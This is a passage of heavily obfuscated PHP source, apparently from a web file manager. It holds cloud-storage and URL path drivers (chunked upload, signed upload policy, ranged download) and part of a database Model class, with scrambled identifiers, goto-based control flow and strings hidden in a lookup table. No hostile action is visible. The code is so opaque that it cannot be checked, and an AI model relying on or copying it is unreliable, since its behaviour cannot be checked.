+= $cÃ¤Š‰Ş; if ($E›çˆ•¦È < $dĞŸõŞÒ–³) { break; } continue; } if ($AœŞ«ÀöÎ) { if ($cÃ¤Š‰Ş) { return !0; } } else { if ($FĞ¹´¿£Ÿù) { return !0; } } if (count($B½ŞÔªĞÍà) < $dĞŸõŞÒ–³) { break; } } if ($Dƒ¨“ôù™ß) { return array($E“ÅÏï³ğ§[191] => $bŠ¸ŒØÊéù, $E“ÅÏï³ğ§[192] => $BíŞ‚½ğÜ); } return !1; goto BÑä²À¿¤¾; BÑä²À¿¤¾: } public function listAll($E¹¿Ç‹’Ùë) { $E¶–“°øË± = array(); $this->recursionAllFiles($E¹¿Ç‹’Ùë, $E¶–“°øË±); return $E¶–“°øË±; } public function canRead($BëÄ–­á¥) { return $this->exist($BëÄ–­á¥) ? !0 : !1; } public function canWrite($EˆÛ¸¯›Œ†) { return $this->exist($EˆÛ¸¯›Œ†) ? !0 : !1; } public function getContent($DÒ’¢À©¬Æ) { return $this->fileSubstr($DÒ’¢À©¬Æ, 0, -1); } public function setContent($C­ó¬¤ñöÛ, $A³‡¥©º› = '') { $C«Ëô’‘í =& $_SERVER[Æ]; if (!$A³‡¥©º›) { $a¡×ˆÜÃ˜æ = $this->ussRequest($C­ó¬¤ñöÛ, $C«Ëô’‘í[212]); return $a¡×ˆÜÃ˜æ[$C«Ëô’‘í[1032]]; } $B—¥ñˆí = $this->tempFile($this->pathThis($C­ó¬¤ñöÛ)); file_put_contents($B—¥ñˆí, $A³‡¥©º›); if ($this->upload($C­ó¬¤ñöÛ, $B—¥ñˆí)) { $this->tempFileRemve($B—¥ñˆí); return !0; } return !1; } public function fileSubstr($AëÛØÒãù“, $EìŞİ‹¶Ú, $F……¨‚µô) { $FĞ³ºï­‘· =& $_SERVER[Æ]; if (!($DµÜ âÖì¼ = $this->link($AëÛØÒãù“))) { return !1; } $fåŒÅå½³ = !1; if ($F……¨‚µô > 0) { $D„Š„Ë–Ì = $EìŞİ‹¶Ú + $F……¨‚µô - 1; $fåŒÅå½³ = array($FĞ³ºï­‘·[1219] . $EìŞİ‹¶Ú . $FĞ³ºï­‘·[412] . $D„Š„Ë–Ì); } $b¹É°ˆÑË = url_request($DµÜ âÖì¼, $FĞ³ºï­‘·[216], !1, $fåŒÅå½³); return $b¹É°ˆÑË[$FĞ³ºï­‘·[687]] ? $b¹É°ˆÑË[$FĞ³ºï­‘·[1034]] : !1; } public function upload($B°äãëáÌç, $FÊìËØ‚ğí, $B‡¸‹¾®„ = false, $A©õ½ØÒĞ® = REPEAT_REPLACE) { goto FÀğøË¥°; a¦ÁÎƒÏÔâ: $a’ÑÌğ‚ĞÀ = $this->ussRequest($B°äãëáÌç, $bÖÌİâå¡¸[214], !1, $a»É¤œ£Àì); return $a’ÑÌğ‚ĞÀ[$bÖÌİâå¡¸[1032]] ? $this->getPathOuter($eêÕÄ­¥àÏ) : !1; goto AôÜÛŠõ‡¼; C‘¤Ö„åĞ×: if (!$a’ÑÌğ‚ĞÀ[$bÖÌİâå¡¸[1032]]) { return !1; } $A¾âˆîÅß… = $a’ÑÌğ‚ĞÀ[$bÖÌİâå¡¸[1034]]; $dÓÚ©´¯ù¤ = 0; goto e¤‡ª‹Ùåà; fÙà”ÑßÖ: $cÉÕäË¢‡ç = 1024 * 1024 * 10; $a»É¤œ£Àì = array($bÖÌİâå¡¸[1260], $bÖÌİâå¡¸[1261] . $dÍëóçĞŞ±, $bÖÌİâå¡¸[1262], $bÖÌİâå¡¸[1263] . $cÉÕäË¢‡ç); $a’ÑÌğ‚ĞÀ = $this->ussRequest($B°äãëáÌç, $bÖÌİâå¡¸[214], !1, $a»É¤œ£Àì); goto C‘¤Ö„åĞ×; Fß×Ê•ÅÚÑ: do { $e“µëÌÄ¾Ï = $A¾âˆîÅß…[$bÖÌİâå¡¸[1265]]; fseek($DÁî½¹¦Ü£, $dÓÚ©´¯ù¤); $AòéÄŠÊ×” = fread($DÁî½¹¦Ü£, $e“µëÌÄ¾Ï); $aÉä¾¢õÂä = 0; do { $aÉä¾¢õÂä++; $A¾âˆîÅß… = $this->uploadPart($B°äãëáÌç, $A¾âˆîÅß…, $AòéÄŠÊ×”); } while (!$A¾âˆîÅß… && $aÉä¾¢õÂä < 3); if (!$A¾âˆîÅß…) { return !1; } $B…òáœˆ±ø = $A¾âˆîÅß…[$bÖÌİâå¡¸[1264]]; $dÓÚ©´¯ù¤ += $e“µëÌÄ¾Ï; } while ($B…òáœˆ±ø != -1); fclose($DÁî½¹¦Ü£); $a»É¤œ£Àì = array($bÖÌİâå¡¸[1266], $bÖÌİâå¡¸[1267] . $A¾âˆîÅß…[$bÖÌİâå¡¸[1268]], $bÖÌİâå¡¸[1262]); goto a¦ÁÎƒÏÔâ; e¤‡ª‹Ùåà: $B…òáœˆ±ø = $A¾âˆîÅß…[$bÖÌİâå¡¸[1264]]; $DÁî½¹¦Ü£ = fopen($FÊìËØ‚ğí, $bÖÌİâå¡¸[1169]); if (!$DÁî½¹¦Ü£) { return !1; } goto Fß×Ê•ÅÚÑ; FÀğøË¥°: $bÖÌİâå¡¸ =& $_SERVER[Æ]; $dÍëóçĞŞ± = IO::size($FÊìËØ‚ğí); if ($dÍëóçĞŞ± <= 1024 * 1024 * 200) { $DŞïŠ¥šíÄ = array($bÖÌİâå¡¸[1259] . $FÊìËØ‚ğí); $a’ÑÌğ‚ĞÀ = $this->ussRequest($B°äãëáÌç, $bÖÌİâå¡¸[214], $DŞïŠ¥šíÄ); return $a’ÑÌğ‚ĞÀ[$bÖÌİâå¡¸[1032]] ? $this->getPathOuter($B°äãëáÌç) : !1; } goto fÙà”ÑßÖ; AôÜÛŠõ‡¼: } private function uploadPart($b¹…Ú™æß, $bÑÎâõ—Ş, &$fäÙÅ¶Ûé) { $eÕãï¬ÚĞí =& $_SERVER[Æ]; $aÓÂÇŞæœ = array($eÕãï¬ÚĞí[1269], $eÕãï¬ÚĞí[1267] . $bÑÎâõ—Ş[$eÕãï¬ÚĞí[1268]], $eÕãï¬ÚĞí[1270] . $bÑÎâõ—Ş[$eÕãï¬ÚĞí[1264]], $eÕãï¬ÚĞí[138] . $bÑÎâõ—Ş[$eÕãï¬ÚĞí[1265]]); $fÑÙ“¼££ = $this->ussRequest($b¹…Ú™æß, $eÕãï¬ÚĞí[214], $fäÙÅ¶Ûé, $aÓÂÇŞæœ); return !$fÑÙ“¼££[$eÕãï¬ÚĞí[1032]] ? $fÑÙ“¼££[$eÕãï¬ÚĞí[1032]] : $fÑÙ“¼££[$eÕãï¬ÚĞí[1034]]; } public function uploadFormData($DÛÈ¾ŞœÍÎ, $dÅ­œŠÌÄÉ = 3600) { return $this->uploadPolicy($DÛÈ¾ŞœÍÎ, $dÅ­œŠÌÄÉ); } public function multiUploadFormData($a¡¯É“æãÊ, $Aô™­–ƒ¶ = 3600) { $C¸âŠÒ =& $_SERVER[Æ]; $eá† åß˜• = (int) $GLOBALS[$C¸âŠÒ[7]][$C¸âŠÒ[77]]; return $this->uploadPolicy($a¡¯É“æãÊ, $Aô™­–ƒ¶, $eá† åß˜•); } private function uploadPolicy($a—ÄÎ÷ÇÂ, $dš×‰½÷¿ = 3600, $eâ†Ü¯‰çœ = 0) { goto bò®ÒÈÒ°Ç; b²…İÊİõ: $CÌ¡ñö‘Æ– = base64_encode(hash_hmac($fˆØÇÕÇÊ×[1241], "\120\x4f\123\x54\46{$BŞ¸æŞçğ»}\x26{$cù£ ‘Ø˜}\x26{$EÕğÏì²}", md5("{$this->userpass}"), !0)); $BÜØ™ö Ö‘ = array($fˆØÇÕÇÊ×[1112] => $EÕğÏì², $fˆØÇÕÇÊ×[1275] => "\125\x50\x59\125\x4e\40{$this->username}\72{$CÌ¡ñö‘Æ–}", $fˆØÇÕÇÊ×[169] => $this->endpoint . $BŞ¸æŞçğ»); return $BÜØ™ö Ö‘; goto cÌ†¯¨Óùá; c¡äÑİÆÊÅ: $fáÉƒ‡†² = array($fˆØÇÕÇÊ×[1271] => $this->bucket, $fˆØÇÕÇÊ×[1272] => $a—ÄÎ÷ÇÂ, $fˆØÇÕÇÊ×[1273] => time() + $dš×‰½÷¿, $fˆØÇÕÇÊ×[1274] => $cù£ ‘Ø˜); if ($eâ†Ü¯‰çœ) { $fáÉƒ‡†²[$fˆØÇÕÇÊ×[1190]] = $eâ†Ü¯‰çœ; } $EÕğÏì² = base64_encode(json_encode($fáÉƒ‡†²)); goto b²…İÊİõ; bò®ÒÈÒ°Ç: $fˆØÇÕÇÊ× =& $_SERVER[Æ]; $BŞ¸æŞçğ» = $fˆØÇÕÇÊ×[8] . $this->bucket; $cù£ ‘Ø˜ = gmdate($fˆØÇÕÇÊ×[1204]); goto c¡äÑİÆÊÅ; cÌ†¯¨Óùá: } public function download($a‰Ïõ÷¨«, $AƒŞ¦ŠÒ†ğ) { goto EèŸæê©ä; Cá²™©áÕ: fclose($B‚ƒÆ”ô½«); return $AƒŞ¦ŠÒ†ğ; goto eâÖ‚¯ËŠì; F¾¸­õ­£Ë: $f£ÔÈ­ª¹ = 1024 * 200; $B‚ƒÆ”ô½« = fopen($B‰ï‘—ë¶±, $_SERVER[Æ][1225]); while (!0) { $F§ºÁâ¾ëØ = $this->fileSubstr($a‰Ïõ÷¨«, $fä²åİá¢ˆ, $f£ÔÈ­ª¹); if ($F§ºÁâ¾ëØ === !1) { return !1; } fwrite($B‚ƒÆ”ô½«, $F§ºÁâ¾ëØ); $fä²åİá¢ˆ += $f£ÔÈ­ª¹; if (strlen($F§ºÁâ¾ëØ) < $f£ÔÈ­ª¹) { break; } } goto Cá²™©áÕ; EèŸæê©ä: $B‰ï‘—ë¶± = IO::getPathInner(IO::mkfile($AƒŞ¦ŠÒ†ğ)); if (!($CµĞäŞæö¦ = $this->link($a‰Ïõ÷¨«))) { return !1; } $fä²åİá¢ˆ = 0; goto F¾¸­õ­£Ë; eâÖ‚¯ËŠì: } public function link($D¢ùÉÆ¯“, $BŠÚÓÈ¾– = array()) { $Bù½£ë·˜ =& $_SERVER[Æ]; $D¢ùÉÆ¯“ = trim($D¢ùÉÆ¯“, $Bù½£ë·˜[8]); if (!empty($this->token)) { $eÚ®®ñ†Ÿ½ = strtotime(date($Bù½£ë·˜[1276])); $BÎ›˜Á’é = substr(md5($this->token . $Bù½£ë·˜[272] . $eÚ®®ñ†Ÿ½ . $Bù½£ë·˜[1277] . $D¢ùÉÆ¯“), 12, 8) . $eÚ®®ñ†Ÿ½; $BŠÚÓÈ¾–[] = $Bù½£ë·˜[1278] . $BÎ›˜Á’é; } $d¸¾ñéÑîö = !empty($BŠÚÓÈ¾–) ? $Bù½£ë·˜[69] . implode($Bù½£ë·˜[272], $BŠÚÓÈ¾–) : $Bù½£ë·˜[33]; return $this->getHost() . $Bù½£ë·˜[8] . $D¢ùÉÆ¯“ . $d¸¾ñéÑîö; } public function fileOut($EƒÔœ¶ì¡‘, $Aõ½ËµàÍ = false, $EçæÙ‡°Ì¥ = false, $CÌó‹›Î¨— = '') { if (!$EçæÙ‡°Ì¥) { $EçæÙ‡°Ì¥ = $this->pathThis($EƒÔœ¶ì¡‘); } $dÀÕ™—ï¸… = $Aõ½ËµàÍ ? array($_SERVER[Æ][1279] . rawurlencode($EçæÙ‡°Ì¥)) : array(); $F£ğ Øåéƒ = $this->link($EƒÔœ¶ì¡‘, $dÀÕ™—ï¸…); $this->fileOutLink($F£ğ Øåéƒ); } public function fileOutServer($f¡İ©‹” , $D®Ï×ÇØ¾ƒ = false, $c¼¿§Åèƒ = false, $b§‚âÀÊ¦Ü = '') { parent::fileOut($f¡İ©‹” , $D®Ï×ÇØ¾ƒ, $c¼¿§Åèƒ, $b§‚âÀÊ¦Ü); } public function fileOutImage($C•ˆÏËÒ, $BÚ‹¼ˆ›© = 250) { $AŸ†è³ª = $this->link($C•ˆÏËÒ . $_SERVER[Æ][1280] . $BÚ‹¼ˆ›©); $this->fileOutLink($AŸ†è³ª); } public function fileOutImageServer($aÚÔìóœº, $bÕàÚê–Ä = 250) { parent::fileOutImage($aÚÔìóœº, $bÕàÚê–Ä); } public function hashMd5($C±îöÙ¤¼…) { $bùÂÅÊÑæÙ =& $_SERVER[Æ]; $CöØá¶çÄ… = $this->objectMeta($C±îöÙ¤¼…); return isset($CöØá¶çÄ…[$bùÂÅÊÑæÙ[196]]) ? $CöØá¶çÄ…[$bùÂÅÊÑæÙ[196]] : !1; } public function size($c†‚Ó²‚à×) { $aµ‹†‘Å»× = $this->objectMeta($c†‚Ó²‚à×); return $aµ‹†‘Å»× ? $aµ‹†‘Å»×[$_SERVER[Æ][77]] : 0; } public function info($aÉğ’œõ¯Å) { if ($this->isFolder($aÉğ’œõ¯Å)) { return $this->folderInfo($aÉğ’œõ¯Å); } else { if ($this->isFile($aÉğ’œõ¯Å)) { return $this->fileInfo($aÉğ’œõ¯Å); } } return !1; } public function exist($c’šŸ¾„ö») { return $this->isFile($c’šŸ¾„ö») || $this->isFolder($c’šŸ¾„ö»); } public function isFile($Aàù‘ÄŸÅ×) { return !$this->isFolder($Aàù‘ÄŸÅ×) && $this->objectMeta($Aàù‘ÄŸÅ×); } public function isFolder($c´ÖÒŞŞ««) { return $this->cacheMethod($_SERVER[Æ][223], $c´ÖÒŞŞ««); } protected function objectMeta($F†£´µ˜Ô ) { return $this->cacheMethod($_SERVER[Æ][224], $F†£´µ˜Ô ); } protected function _objectMeta($Dƒéíï¹ Ä) { goto FÁ·±¸±ˆó; fŠ¼±îÀ: if (!$CÖÎêÜ±Á¼[$A™í»˜ä×[1032]]) { return null; } $Eì•½—È§ñ = isset($CÖÎêÜ±Á¼[$A™í»˜ä×[1034]]) ? $CÖÎêÜ±Á¼[$A™í»˜ä×[1034]] : array(); if (!isset($Eì•½—È§ñ[$A™í»˜ä×[1282]])) { return null; } goto dÚÓ¿öÍÍÙ; dÚÓ¿öÍÍÙ: $A«¤åÀË£È = array($A™í»˜ä×[28] => get_path_this($Dƒéíï¹ Ä), $A™í»˜ä×[29] => isset($Eì•½—È§ñ[$A™í»˜ä×[1282]]) ? $Eì•½—È§ñ[$A™í»˜ä×[1282]] : null, $A™í»˜ä×[77] => isset($Eì•½—È§ñ[$A™í»˜ä×[1283]]) ? $Eì•½—È§ñ[$A™í»˜ä×[1283]] : null, $A™í»˜ä×[196] => isset($Eì•½—È§ñ[$A™í»˜ä×[1284]]) ? $Eì•½—È§ñ[$A™í»˜ä×[1284]] : null, $A™í»˜ä×[1252] => isset($Eì•½—È§ñ[$A™í»˜ä×[1285]]) ? $Eì•½—È§ñ[$A™í»˜ä×[1285]] : null); $A«¤åÀË£È[$A™í»˜ä×[1253]] = isset($Eì•½—È§ñ[$A™í»˜ä×[1286]]) ? strtotime($Eì•½—È§ñ[$A™í»˜ä×[1286]]) : $A«¤åÀË£È[$A™í»˜ä×[1252]]; return $A«¤åÀË£È; goto e‰™Î®²ÕÕ; FÁ·±¸±ˆó: $A™í»˜ä× =& $_SERVER[Æ]; if ($Dƒéíï¹ Ä == $A™í»˜ä×[33] || $Dƒéíï¹ Ä == $A™í»˜ä×[8]) { return array(); } $CÖÎêÜ±Á¼ = $this->ussRequest($Dƒéíï¹ Ä, $A™í»˜ä×[1281]); goto fŠ¼±îÀ; e‰™Î®²ÕÕ: } protected function _isFolder($a‘´Ğ­ÎáŞ) { $cÁêÙºƒ… =& $_SERVER[Æ]; if ($a‘´Ğ­ÎáŞ == $cÁêÙºƒ…[33] || $a‘´Ğ­ÎáŞ == $cÁêÙºƒ…[8]) { return !0; } $c»ñá‰ˆï = $this->objectMeta($a‘´Ğ­ÎáŞ); return isset($c»ñá‰ˆï[$cÁêÙºƒ…[29]]) && $c»ñá‰ˆï[$cÁêÙºƒ…[29]] == $cÁêÙºƒ…[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($fŸèŒòÃùÒ = false) { } public function exist($A£Ã†„ÕÍÊ) { $A©¼¡æ•¬¥ = $this->info($A£Ã†„ÕÍÊ); return $A©¼¡æ•¬¥[$_SERVER[Æ][188]]; } public function isFile($Cèä™ÛâÄ‹) { $e¼è‚âè = $this->info($Cèä™ÛâÄ‹); return $e¼è‚âè[$_SERVER[Æ][188]]; } public function isFolder($a‚†í±êË) { return !1; } public function size($fù‡ƒŸ¹’¢) { $DÈÍèôàÔ³ = $this->info($fù‡ƒŸ¹’¢); return $DÈÍèôàÔ³[$_SERVER[Æ][77]]; } public function info($BÒ´Õ½ÔĞ) { return $this->infoParse($BÒ´Õ½ÔĞ); } public function infoAuth($c£³öª«»·) { return $this->infoParse($c£³öª«»·); } public function infoWithChildren($d‰åÅ•øÕ™) { return $this->infoParse($d‰åÅ•øÕ™); } public function infoFull($f£–é¢ø¹) { return $this->infoParse($f£–é¢ø¹); } private function infoParse($d²öˆªÚ‘) { $fá½¥Ø–“‘ =& $_SERVER[Æ]; $bÑ¨Œ¾£‡¹ = $this->header($d²öˆªÚ‘); if (!$bÑ¨Œ¾£‡¹ || !$bÑ¨Œ¾£‡¹[$fá½¥Ø–“‘[687]]) { return !1; } $DÜÑÍ¡¢ğø = _get($bÑ¨Œ¾£‡¹, $fá½¥Ø–“‘[325], 0); $cÈáÛ–‘õÇ = array($fá½¥Ø–“‘[28] => $bÑ¨Œ¾£‡¹[$fá½¥Ø–“‘[28]], $fá½¥Ø–“‘[75] => $d²öˆªÚ‘, $fá½¥Ø–“‘[29] => $fá½¥Ø–“‘[167], $fá½¥Ø–“‘[77] => intval($DÜÑÍ¡¢ğø), $fá½¥Ø–“‘[160] => get_path_ext($bÑ¨Œ¾£‡¹[$fá½¥Ø–“‘[28]]), $fá½¥Ø–“‘[1161] => $DÜÑÍ¡¢ğø > 0 && $bÑ¨Œ¾£‡¹[$fá½¥Ø–“‘[1287]], $fá½¥Ø–“‘[1162] => !1); return $cÈáÛ–‘õÇ; } private function header($C¦±‰’İŒ) { if (isset(self::$_cacheHeader[$C¦±‰’İŒ])) { return self::$_cacheHeader[$C¦±‰’İŒ]; } self::$_cacheHeader[$C¦±‰’İŒ] = url_header($C¦±‰’İŒ); return self::$_cacheHeader[$C¦±‰’İŒ]; } public function hashSimple($eÈ¥«Üª¯, $bºéÅóƒö† = false) { goto E¾›ƒÂêŸ; d‰ë±ÙÙ¡Ë: $EğÉ÷ä¯«° = timeFloat(); $d¿½Êñà = 15; for ($eƒÁêáŠ‚ë = 0; $eƒÁêáŠ‚ë < $DÍ’”…„; $eƒÁêáŠ‚ë++) { if (timeFloat() - $EğÉ÷ä¯«° > $d¿½Êñà) { return !1; } $B‡÷èÛ°Åœ = $this->fileSubstr($eÈ¥«Üª¯, $eäÔó‹Ó * $eƒÁêáŠ‚ë, $bÛÍà„ãÎ©); if (!$B‡÷èÛ°Åœ) { return !1; } $C¯ÍÎ”Èé… .= $B‡÷èÛ°Åœ; } goto a’£›µÒ¨å; DÊƒ¬£•›ò: if ($fÆùïŠ…Ë‰ <= $bÛÍà„ãÎ© * $DÍ’”…„) { return md5($this->fileSubstr($eÈ¥«Üª¯, 0, $fÆùïŠ…Ë‰)) . $fÆùïŠ…Ë‰; } $eäÔó‹Ó = intval($fÆùïŠ…Ë‰ / $DÍ’”…„); $C¯ÍÎ”Èé… = $CÈŸ–À«™÷[33]; goto d‰ë±ÙÙ¡Ë; a Â—ßŒö: $fÆùïŠ…Ë‰ = $f¥…ˆîŒ¡[$CÈŸ–À«™÷[77]]; $bÛÍà„ãÎ© = 200; $DÍ’”…„ = 50; goto DÊƒ¬£•›ò; a’£›µÒ¨å: $C¯ÍÎ”Èé… .= $this->fileSubstr($eÈ¥«Üª¯, $fÆùïŠ…Ë‰ - $bÛÍà„ãÎ©, $bÛÍà„ãÎ©); return md5($C¯ÍÎ”Èé…) . $fÆùïŠ…Ë‰; goto B‘»¢ì¥ÕÀ; E¾›ƒÂêŸ: $CÈŸ–À«™÷ =& $_SERVER[Æ]; $f¥…ˆîŒ¡ = $this->info($eÈ¥«Üª¯); if (!$f¥…ˆîŒ¡ || !$f¥…ˆîŒ¡[$CÈŸ–À«™÷[188]]) { return !1; } goto a Â—ßŒö; B‘»¢ì¥ÕÀ: } public function getContent($e›Ü‘Èî˜‡) { return $this->fileSubstr($e›Ü‘Èî˜‡); } public function fileSubstr($e–õ™ãá‰Õ, $BøŠÌ¹àé = 0, $aêÜ‡– Í = -1) { goto AâëÙÎºî; AâëÙÎºî: $a’Ä…ê‡œ‚ =& $_SERVER[Æ]; $bõê²¢’˜ = $this->info($e–õ™ãá‰Õ); if (!$bõê²¢’˜ || !$bõê²¢’˜[$a’Ä…ê‡œ‚[188]] && $bõê²¢’˜[$a’Ä…ê‡œ‚[77]] > 1024 * 1024 * 10) { return !1; } goto aÊ“ö×í¨ˆ; b•ï®ŸÆá: $Fãì âÊ = url_request($e–õ™ãá‰Õ, $a’Ä…ê‡œ‚[216], !1, $d–İ£â…¾, !1, !1, 1); return $Fãì âÊ[$a’Ä…ê‡œ‚[1034]] ? $Fãì âÊ[$a’Ä…ê‡œ‚[1034]] : $a’Ä…ê‡œ‚[33]; goto f¾ËÆ‹¼¸; aÊ“ö×í¨ˆ: if ($aêÜ‡– Í === -1) { $aêÜ‡– Í = $bõê²¢’˜[$a’Ä…ê‡œ‚[77]]; } if ($aêÜ‡– Í == 0) { return $a’Ä…ê‡œ‚[33]; } $d–İ£â…¾ = array($a’Ä…ê‡œ‚[1288] . $BøŠÌ¹àé . $a’Ä…ê‡œ‚[714] . ($BøŠÌ¹àé + $aêÜ‡– Í - 1)); goto b•ï®ŸÆá; f¾ËÆ‹¼¸: } public function download($FÒõùÈ¦º…, $c¯ŒÈ©½§) { Downloader::start($FÒõùÈ¦º…, $c¯ŒÈ©½§); return $c¯ŒÈ©½§; } } goto F£ÄÈáˆÑØ; d†Åë¢èâ¸: define($_SERVER[Æ][230], 0); define($_SERVER[Æ][231], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\x6f\162\x64\x65\162", "\x61\x6c\151\x61\163", "\150\x61\166\151\156\x67", "\x67\x72\157\165\x70", "\154\x6f\x63\153", "\x64\x69\163\x74\151\x6e\143\x74", "\x61\165\164\157", "\x66\x69\154\x74\x65\x72", "\x76\141\x6c\151\x64\x61\164\145", "\162\x65\163\x75\x6c\x74", "\x62\x69\x6e\144", "\x74\157\153\x65\x6e"); public function __construct($DÇ»¹õ¯…Ã = '', $cçĞ›“à‰ = '', $dº¡öËİ² = '') { $B§Â›•èçœ =& $_SERVER[Æ]; $this->_initialize(); if (!empty($DÇ»¹õ¯…Ã)) { if (strpos($DÇ»¹õ¯…Ã, $B§Â›•èçœ[91])) { list($this->dbName, $this->name) = explode($B§Â›•èçœ[91], $DÇ»¹õ¯…Ã); } else { $this->name = $DÇ»¹õ¯…Ã; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($cçĞ›“à‰)) { $this->tablePrefix = $B§Â›•èçœ[33]; } elseif ($B§Â›•èçœ[33] != $cçĞ›“à‰) { $this->tablePrefix = $cçĞ›“à‰; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($B§Â›•èçœ[232]); } $this->db(0, empty($this->connection) ? $dº¡öËİ² : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $CÅ‘ÇËÙ„ =& $_SERVER[Æ]; if (empty($this->fields)) { if (think_config($CÅ‘ÇËÙ„[233])) { $B‚³¿áÑÄ = $this->dbName ? $this->dbName : think_config($CÅ‘ÇËÙ„[234]); $A†¥îŒŞ = think_var_cache($CÅ‘ÇËÙ„[235] . strtolower(get_path_this($B‚³¿áÑÄ) . $CÅ‘ÇËÙ„[91] . $this->name)); if ($A†¥îŒŞ) { $A…æµ“Òà¨ = think_config($CÅ‘ÇËÙ„[236]); if (empty($A…æµ“Òà¨) || $A†¥îŒŞ[$CÅ‘ÇËÙ„[237]] == $A…æµ“Òà¨) { $this->fields = $A†¥îŒŞ; return; } } } $this->flush(); } } public function flush() { goto b„‹µäÃ¹å; a­ºğè±×: if (think_config($eÒ¶¨‘Õ¶«[233])) { $fØòğÓõ¯ = $this->dbName ? $this->dbName : think_config($eÒ¶¨‘Õ¶«[234]); think_var_cache($eÒ¶¨‘Õ¶«[235] . strtolower(get_path_this($fØòğÓõ¯) . $eÒ¶¨‘Õ¶«[91] . $this->name), $this->fields); } goto F¥ ¡†­Ùì; b„‹µäÃ¹å: $eÒ¶¨‘Õ¶« =& $_SERVER[Æ]; $this->db->setModel($this->name); $A¦¯õçŸà = $this->db->getFields($this->getTableName()); goto B˜ëªŠˆŞ¥; d¥ñ£ºª¿‹: foreach ($A¦¯õçŸà as $C‰ã×ÄÜ‚ => $EÔà•¼³ˆ) { $Dµ°´ô½Â[$C‰ã×ÄÜ‚] = $EÔà•¼³ˆ[$eÒ¶¨‘Õ¶«[29]]; if ($EÔà•¼³ˆ[$eÒ¶¨‘Õ¶«[36]]) { $this->fields[$eÒ¶¨‘Õ¶«[239]] = $C‰ã×ÄÜ‚; if ($EÔà•¼³ˆ[$eÒ¶¨‘Õ¶«[39]]) { $this->fields[$eÒ¶¨‘Õ¶«[238]] = !0; } } } $this->fields[$eÒ¶¨‘Õ¶«[240]] = $Dµ°´ô½Â; if (think_config($eÒ¶¨‘Õ¶«[236])) { $this->fields[$eÒ¶¨‘Õ¶«[237]] = think_config($eÒ¶¨‘Õ¶«[236]); } goto a­ºğè±×; B˜ëªŠˆŞ¥: if (!$A¦¯õçŸà) { return !1; } $this->fields = array_keys($A¦¯õçŸà); $this->fields[$eÒ¶¨‘Õ¶«[238]] = !1; goto d¥ñ£ºª¿‹; F¥ ¡†­Ùì: } public function switchModel($EÔê¸Ø¬Ãó, $cÖô¦‡¦Êï = array()) { $d•«Áµê® =& $_SERVER[Æ]; $E­–¤¯Ìå = ucwords(strtolower($EÔê¸Ø¬Ãó)) . $d•«Áµê®[241]; if (!class_exists($E­–¤¯Ìå)) { think_exception($E­–¤¯Ìå . think_lang($d•«Áµê®[242])); } $this->_extModel = new $E­–¤¯Ìå($this->name); if (!empty($cÖô¦‡¦Êï)) { foreach ($cÖô¦‡¦Êï as $b÷¯ËÃ—É) { $this->_extModel->setProperty($b÷¯ËÃ—É, $this->{$b÷¯ËÃ—É}); } } return $this->_extModel; } public function __set($C¯Œ‹™àá‘, $b„¸¹¦ÕŞ²) { $this->data[$C¯Œ‹™àá‘] = $b„¸¹¦ÕŞ²; } public function __get($DØÔÅÓö„š) { return isset($this->data[$DØÔÅÓö„š]) ? $this->data[$DØÔÅÓö„š] : null; } public function __isset($BÊÔ¿¿‡˜³) { return isset($this->data[$BÊÔ¿¿‡˜³]); } public function __unset($b¥£á££Õ¾) { unset($this->data[$b¥£á££Õ¾]); } public function __call($eÃæ™Â‡×‰, $D“Âšù‡Ú–) { $e”é´§Û¬ =& $_SERVER[Æ]; if (in_array(strtolower($eÃæ™Â‡×‰), $this->methods, !0)) { $this->options[strtolower($eÃæ™Â‡×‰)] = $D“Âšù‡Ú–[0]; return $this; } elseif (in_array(strtolower($eÃæ™Â‡×‰), array($e”é´§Û¬[243], $e”é´§Û¬[244], $e”é´§Û¬[245], $e”é´§Û¬[246], $e”é´§Û¬[247]), !0)) { $f„›µº„´İ = isset($D“Âšù‡Ú–[0]) ? $D“Âšù‡Ú–[0] : $e”é´§Û¬[176]; $f„›µº„´İ = $this->db->parseKey($f„›µº„´İ); return $this->getField(strtoupper($eÃæ™Â‡×‰) . $e”é´§Û¬[248] . $f„›µº„´İ . $e”é´§Û¬[249] . $eÃæ™Â‡×‰, $e”é´§Û¬[243]); } elseif (strtolower(substr($eÃæ™Â‡×‰, 0, 5)) == $e”é´§Û¬[250]) { $f„›µº„´İ = think_parse_name(substr($eÃæ™Â‡×‰, 5)); $A†õ¾œ¬®Ó[$f„›µº„´İ] = $D“Âšù‡Ú–[0]; return $this->where($A†õ¾œ¬®Ó)->find(); } elseif (strtolower(substr($eÃæ™Â‡×‰, 0, 10)) == $e”é´§Û¬[251]) { $cÏÂÔğÇ´ = think_parse_name(substr($eÃæ™Â‡×‰, 10)); $A†õ¾œ¬®Ó[$cÏÂÔğÇ´] = $D“Âšù‡Ú–[0]; return $this->where($A†õ¾œ¬®Ó)->getField($D“Âšù‡Ú–[1]); } elseif (isset($this->_scope[$eÃæ™Â‡×‰])) { return $this->scope($eÃæ™Â‡×‰, $D“Âšù‡Ú–[0]); } elseif (method_exists($this, $eÃæ™Â‡×‰)) { array_unshift($D“Âšù‡Ú–, $eÃæ™Â‡×‰); return call_user_func_array(array($this, $e”é´§Û¬[252]), $D“Âšù‡Ú–); } else { return call_user_func_array(array(parent, $eÃæ™Â‡×‰), $D“Âšù‡Ú–); } } protected function call() { goto Fß¯‹Œİ¤; C„ãÙŞä”: if (isset($B÷¢†¢Ÿ¥[$F®ª®À° °]) && $B÷¢†¢Ÿ¥[$F®ª®À° °] === $B¬ÎŒÈÅ¤) { think_exception(__CLASS__ . $c†Åš‚É³ç[4] . $B¬ÎŒÈÅ¤ . think_lang($c†Åš‚É³ç[253])); return; } $B÷¢†¢Ÿ¥[] = $B¬ÎŒÈÅ¤; if (method_exists($this, $c†Åš‚É³ç[254])) { $E¾†²Ì£Éç = call_user_func_array(array($this, $c†Åš‚É³ç[255]), 